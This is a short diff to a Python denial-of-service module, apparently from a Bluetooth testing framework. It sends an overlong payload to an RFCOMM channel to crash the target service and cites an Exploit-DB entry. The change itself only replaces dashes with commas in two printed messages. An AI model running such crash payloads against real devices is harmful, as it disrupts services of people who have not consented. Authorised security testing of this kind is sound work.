@@ -119,7 +119,7 @@ class Module(DosModule):
         print(f"  {C.RED}╚{'═'*55}╝{C.RESET}\n")
         print_info(f"Target : {target}  RFCOMM ch.{channel}")
         print_info(f"Payload: 'A'×{length} + 'ZZ'")
-        print_warning("Authorized testing only — target service will crash")
+        print_warning("Authorized testing only, target service will crash")
 
         sock = None
         try:
@@ -146,7 +146,7 @@ class Module(DosModule):
                 resp = sock.recv(1024)
                 print_info(f"Response: {len(resp)} bytes")
             except Exception:
-                print_info("No response — service likely crashed")
+                print_info("No response, service likely crashed")
 
             self.add_result({
                 "target": target, "edb_id": 27094,
